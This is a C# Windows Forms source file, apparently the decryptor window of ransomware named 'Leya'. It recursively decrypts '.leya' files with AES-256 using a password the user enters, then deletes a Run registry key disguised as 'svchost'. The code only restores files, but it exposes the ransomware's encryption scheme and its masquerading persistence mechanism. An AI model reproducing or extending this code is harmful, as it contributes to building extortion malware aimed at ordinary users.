using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Windows.Forms.VisualStyles.VisualStyleElement.StartPanel;

namespace LeyaCleanV.Forms
{
    public partial class Decryptor : Form
    {
        string userName = Environment.UserName;
        string userDir = "C:\\Users\\";
        public Decryptor()
        {
            InitializeComponent();
        }
        [DllImport("user32.dll", EntryPoint = "ReleaseCapture")]
        private extern static void ReleaseCapture();
        [DllImport("user32.dll", EntryPoint = "SendMessage")]
        private extern static void SendMessageA(System.IntPtr hWnd, int wMsg, int wParam, int lParam);
        protected override void WndProc(ref Message m)
        {
            const int WM_NCCALCSIZE = 0x0083;
            if (m.Msg == WM_NCCALCSIZE && m.WParam.ToInt32() == 0)
            {
                return;
            }
            base.WndProc(ref m);
        }
        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            this.FormBorderStyle = FormBorderStyle.None;
        }

        public byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;


            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {

                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();


                }
            }

            return decryptedBytes;
        }

        public void DecryptFile(string file, string password)
        {
            try
            {
                byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
                byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
                passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                byte[] bytesDecrypted = AES_Decrypt(bytesToBeDecrypted, passwordBytes);

                File.WriteAllBytes(file, bytesDecrypted);
                string extension = System.IO.Path.GetExtension(file);
                string result = file.Substring(0, file.Length - extension.Length);
                System.IO.File.Move(file, result);
            }
            catch { }
        }

        public void DecryptDirectory(string location)
        {
            string password = textBox1.Text;

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            try
            {
                for (int i = 0; i < files.Length; i++)
                {
                    string extension = Path.GetExtension(files[i]);
                    if (extension == ".leya")
                    {
                        DecryptFile(files[i], password);
                    }
                }
                for (int i = 0; i < childDirectories.Length; i++)
                {
                    DecryptDirectory(childDirectories[i]);
                }
                label3.Visible = true;
                MessageBox.Show("Ваши файлы успешно расшифрованы!", "Leya");
                string itemName = "svchost";
                RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);

                if (key.GetValue(itemName) != null)
                {
                    key.DeleteValue(itemName);
                }
            }
            catch { }
           
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string path = "\\Desktop\\test\\";
            string fullpath = userDir + userName + path;
            DecryptDirectory(fullpath);
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
                ReleaseCapture();
                SendMessageA(this.Handle, 0x112, 0xf012, 0);
        }
    }
}
